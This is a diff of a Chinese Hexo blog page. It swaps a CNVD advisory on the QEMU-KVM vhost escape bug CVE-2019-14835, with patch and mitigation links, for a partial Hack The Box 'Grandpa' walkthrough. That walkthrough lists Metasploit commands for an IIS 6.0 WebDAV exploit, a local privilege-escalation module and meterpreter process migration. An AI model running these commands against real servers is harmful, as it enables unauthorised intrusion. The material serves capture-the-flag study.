@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>关于QEMU-KVM虚拟机存在内核逃逸漏洞的预警通知 | Hexo</title>
-  <meta name="keywords" content=" 博客 , 安全事件 ">
-  <meta name="description" content="关于QEMU-KVM虚拟机存在内核逃逸漏洞的预警通知 | Hexo">
+  <title>htb之Grandpa | Hexo</title>
+  <meta name="keywords" content=" htb , 博客 ">
+  <meta name="description" content="htb之Grandpa | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="转载原地址：http://www.myh0st.cn/index.php/archives/67/msf作为一款强大的漏洞检测工具，如何生成适用于msf的payload以及如何利用是使用msf的关键，今天就主要记录一下常用的payload以及如何使用。生成payload使用的工具是MSFVenom，下面看看他的帮助信息。 在kali下可以使用如下命令列出MSFVenom可以生成的payload列表">
 <meta name="keywords" content="博客,工具">
@@ -252,9 +252,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-关于QEMU-KVM虚拟机存在内核逃逸漏洞的预警通知" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-htb之Grandpa" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">关于QEMU-KVM虚拟机存在内核逃逸漏洞的预警通知</h1>
+        <h1 class="article-title">htb之Grandpa</h1>
     
     <div class="article-meta">
         
@@ -262,23 +262,23 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="安全通报">安全通报</a>
+                <a href="javascript:" data-rel="渗透笔记">渗透笔记</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">博客</a>
+            <a href="javascript:" class="color4">htb</a>
             
-            <a href="javascript:" class="color5">安全事件</a>
+            <a href="javascript:" class="color3">博客</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-09 14:42:17'>2019-10-09 14:40</time>
+        创建时间:<time class="date" title='更新时间: 2019-10-16 10:19:17'>2019-10-16 09:27</time>
         
     </div>
     <div class="article-meta">
@@ -300,7 +300,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Grandpa"><span class="toc-text">htb之Grandpa</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -316,8 +316,27 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>2019年9月，国家信息安全漏洞共享平台（CNVD）收录了由腾讯安全平台部Tencent Blade Team发现并报告的QEMU-KVM虚拟机内核逃逸漏洞（CNVD-C-2019-135439，对应CVE-2019-14835）。攻击者利用该漏洞，可在未授权的情况下实现虚拟机逃逸。目前漏洞相关细节和验证代码已公开，Linux发行版厂商已发布补丁完成修复。<br>一、漏洞情况分析<br>VHOST/VHOST_NET是QEMU-KVM虚拟化平台中VIRTIO（I/O虚拟化框架）Network的后端实现方案，在Linux内核层面负责处理虚拟机的网络包收发功能。虚拟机中VIRTIO Network前端驱动通过与宿主机内核中的VHOST/VHOST_NET通信，将网络包收发任务交给VHOST/VHOST_NET来处理，实现网络虚拟化。<br>2019年9月，国家信息安全漏洞共享平台（CNVD）收录了由腾讯安全平台部Tencent Blade Team发现并报告的QEMU-KVM虚拟机内核逃逸漏洞。由于VHOST/VHOST_NET缺少对内核缓冲区的严格访问边界校验，攻击者可通过在虚拟机中更改VIRTIO network前端驱动，在该虚拟机被热迁移时，触发内核缓冲区溢出实现虚拟机逃逸，获得在宿主机内核中任意执行代码的权限，攻击者也可触发宿主机内核崩溃实现拒绝服务攻击。<br> CNVD对该漏洞的综合评级为“高危”。<br>二、漏洞影响范围<br>漏洞影响的Linux内核版本如下：<br>2.6.34版本到5.2.x版本的Linux内核，参考该内核commit引入漏洞<br><a href="https://github.com/torvalds/linux/commit/3a4d5c94e959359ece6d6b55045c3f046677f55c" target="_blank" rel="noopener">https://github.com/torvalds/linux/commit/3a4d5c94e959359ece6d6b55045c3f046677f55c</a><br>三、漏洞处置建议<br>1、正式解决方案：<br>Linux内核主线已于9月15日发布补丁，用户可参照补丁代码进行修复：<br><a href="https://github.com/torvalds/linux/commit/060423bfdee3f8bc6e2c1bac97de24d5415e2bc4" target="_blank" rel="noopener">https://github.com/torvalds/linux/commit/060423bfdee3f8bc6e2c1bac97de24d5415e2bc4</a><br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/mst/vhost.git/commit/?h=for_linus&amp;id=060423bfdee3f8bc6e2c1bac97de24d5415e2bc4" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/mst/vhost.git/commit/?h=for_linus&amp;id=060423bfdee3f8bc6e2c1bac97de24d5415e2bc4</a><br>使用Linux发行版本的用户可按照发行版厂商公告来修复该漏洞：<br>RedHat:<br><a href="https://access.redhat.com/errata/RHSA-2019:2827" target="_blank" rel="noopener">https://access.redhat.com/errata/RHSA-2019:2827</a><br><a href="https://access.redhat.com/security/vulnerabilities/kernel-vhost" target="_blank" rel="noopener">https://access.redhat.com/security/vulnerabilities/kernel-vhost</a><br>Ubuntu:<br><a href="https://usn.ubuntu.com/4135-2/" target="_blank" rel="noopener">https://usn.ubuntu.com/4135-2/</a><br>Debian:<br><a href="https://www.debian.org/security/2019/dsa-4531" target="_blank" rel="noopener">https://www.debian.org/security/2019/dsa-4531</a><br>SUSE:<br><a href="https://www.suse.com/security/cve/CVE-2019-14835" target="_blank" rel="noopener">https://www.suse.com/security/cve/CVE-2019-14835</a><br>2、临时解决方案：<br>（1）禁用热迁移功能<br>由于此漏洞只有在虚拟机热迁移过程中才会被触发，可以通过禁用虚拟机热迁移来规避漏洞利用。<br>验证方法：无法对虚拟机使用热迁移。<br>（2）禁用内核vhost-net模块<br>验证方法：modprobe验证virtio_net模块未加载。<br>（3）RedHat版本缓解措施<br><a href="https://access.redhat.com/security/cve/cve-2019-14835" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2019-14835</a></p>
-<p>附参考链接：<br><a href="https://blade.tencent.com/achievements/v-ghost/" target="_blank" rel="noopener">https://blade.tencent.com/achievements/v-ghost/</a><br><a href="https://github.com/torvalds/linux/commit/060423bfdee3f8bc6e2c1bac97de24d5415e2bc4" target="_blank" rel="noopener">https://github.com/torvalds/linux/commit/060423bfdee3f8bc6e2c1bac97de24d5415e2bc4</a><br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/mst/vhost.git/commit/?h=for_linus&amp;id=060423bfdee3f8bc6e2c1bac97de24d5415e2bc4" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/mst/vhost.git/commit/?h=for_linus&amp;id=060423bfdee3f8bc6e2c1bac97de24d5415e2bc4</a><br><a href="https://access.redhat.com/errata/RHSA-2019:2827" target="_blank" rel="noopener">https://access.redhat.com/errata/RHSA-2019:2827</a><br><a href="https://access.redhat.com/security/vulnerabilities/kernel-vhost" target="_blank" rel="noopener">https://access.redhat.com/security/vulnerabilities/kernel-vhost</a><br><a href="https://access.redhat.com/security/cve/cve-2019-14835" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2019-14835</a><br><a href="https://usn.ubuntu.com/4135-2/" target="_blank" rel="noopener">https://usn.ubuntu.com/4135-2/</a><br><a href="https://people.canonical.com/~ubuntu-security/cve/2019/CVE-2019-14835.html" target="_blank" rel="noopener">https://people.canonical.com/~ubuntu-security/cve/2019/CVE-2019-14835.html</a><br><a href="https://www.debian.org/security/2019/dsa-4531" target="_blank" rel="noopener">https://www.debian.org/security/2019/dsa-4531</a><br><a href="https://security-tracker.debian.org/tracker/CVE-2019-14835" target="_blank" rel="noopener">https://security-tracker.debian.org/tracker/CVE-2019-14835</a><br><a href="https://www.suse.com/security/cve/CVE-2019-14835" target="_blank" rel="noopener">https://www.suse.com/security/cve/CVE-2019-14835</a></p>
+        <h1 id="htb之Grandpa"><a href="#htb之Grandpa" class="headerlink" title="htb之Grandpa"></a>htb之Grandpa</h1><p>nmap 扫一下 10.10.10.14<br><img src="/images/40.png" alt><br>很好简单粗暴，只留一个端口，还是个80<br>ii 6.0？嗯？谷歌一下<br><img src="/images/41.png" alt><br>直接开撸吧<br><img src="/images/42.png" alt><br>这哥们直接添加个模块？？？难道我大msf就没有这个漏洞模块？<br>我深思一下，大感不妙，msf与外界隔离了吗？？这世道都变了吗，外星人要统治地球了？？<br>于是我尝试search<br><img src="/images/43.png" alt><br>嗯～还是熟悉的配方，还是原来的味道<br>很好直接利用吧</p>
+<blockquote>
+<p>msf5 &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl<br>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set rhosts 10.10.10.14<br>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; run</p>
+</blockquote>
+<p>good,连普通用户的旗帜都获取不了，没办法提权吧,先吧这个shell后台挂起，然后拿Metasploit本地漏洞利用建议程序跑一下</p>
+<blockquote>
+<p>meterpreter &gt; background<br>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; use post/multi/recon/local_exploit_suggester<br>msf5 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1<br>msf5 post(multi/recon/local_exploit_suggester) &gt; run</p>
+</blockquote>
+<p><img src="/images/44.png" alt></p>
+<blockquote>
+<p>msf5 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms14_058_track_popup_menu<br>msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; set SESSION 2<br>msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; run</p>
+</blockquote>
+<p>漏洞利用成功之后，返回到一开始我们就获得的shell，然后进程转移</p>
+<blockquote>
+<p>msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; sessions -i 2<br>meterpreter &gt; ps<br><img src="/images/45.png" alt><br>meterpreter &gt; migrate 1820</p>
+</blockquote>
+<p>进程转移成功之后，再把这个shell给挂起来</p>
+<blockquote>
+<p>meterpreter &gt; background</p>
+</blockquote>
+<p>再执行一下提权模块</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -327,12 +346,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>关于QEMU-KVM虚拟机存在内核逃逸漏洞的预警通知</p>
+    <p><span class="copy-title">文章标题:</span>htb之Grandpa</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-09, 14:40:44</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-09, 14:42:17</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/09/关于QEMU-KVM虚拟机存在内核逃逸漏洞的预警通知/" title="关于QEMU-KVM虚拟机存在内核逃逸漏洞的预警通知">https://manmachines.github.io/2019/10/09/关于QEMU-KVM虚拟机存在内核逃逸漏洞的预警通知/</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-16, 09:27:50</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-16, 10:19:17</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/16/htb之Grandpa/" title="htb之Grandpa">https://manmachines.github.io/2019/10/16/htb之Grandpa/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
